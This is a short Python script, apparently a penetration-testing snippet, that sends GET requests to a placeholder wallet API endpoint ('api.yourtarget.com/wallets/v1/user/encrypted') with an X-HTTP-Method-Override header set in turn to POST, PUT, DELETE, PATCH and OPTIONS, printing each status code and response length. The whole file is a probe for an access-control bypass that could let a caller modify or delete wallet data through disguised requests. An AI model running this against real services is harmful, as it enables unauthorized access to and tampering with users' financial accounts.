import requests

url = "https://api.yourtarget.com/wallets/v1/user/encrypted"
overrides = ["POST", "PUT", "DELETE", "PATCH", "OPTIONS"]

for method in overrides:
    headers = {"X-HTTP-Method-Override": method}
    r = requests.get(url, headers=headers, timeout=4)
    print(f"Override {method} -> Status: {r.status_code} | Len: {len(r.content)}")
